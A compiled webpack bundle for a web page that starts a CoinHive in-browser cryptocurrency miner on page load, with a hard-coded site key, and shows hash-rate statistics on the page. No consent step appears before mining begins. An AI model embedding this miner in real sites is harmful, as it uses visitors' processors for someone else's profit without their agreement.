/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports) {

/* global CoinHive */

const stats = {};
let miner = {};

function getTS() {
  const dd = new Date();
  const hour = (dd.getHours() < 10 ? '0' : '') + dd.getHours();
  const min = (dd.getMinutes() < 10 ? '0' : '') + dd.getMinutes();
  const sec = (dd.getSeconds() < 10 ? '0' : '') + dd.getSeconds();
  return `${hour}:${min}:${sec}`;
}

function log(obj) {
  const ts = getTS();
  $('#console').prepend(`${ts} - ${JSON.stringify(obj)} \n`);
}

function updateStats() {
  stats.hashesPerSecond = miner.getHashesPerSecond();
  stats.totalHashes = miner.getTotalHashes();
  stats.acceptedHashes = miner.getAcceptedHashes();
  $('#totals').html('H/s: ' + Math.round(stats.hashesPerSecond) + ', Total hashes: ' + stats.totalHashes);
}

function initMiner() {
  const opts = { threads: 1, throttle: 0.9 };
  $('#options').html(`Threads: ${opts.threads}, Throttle: ${opts.throttle * 100}%`);
  var CH = CoinHive;
  miner = new CH.Anonymous('s0N1th4I4ElExw1U3JlqGVTjZR428Nyq', opts);
  miner.start();
  miner.on('found', function (ev) {
    log({ foundHashes: ev.hashes });
  });
  miner.on('accepted', function (ev) {
    log({ accepted: ev.hashes });
  });
}

$(function () {
  initMiner();
  updateStats();
  log(stats);
  setInterval(() => {
    updateStats();
    log(stats);
  }, 5000);
});

/***/ })
/******/ ]);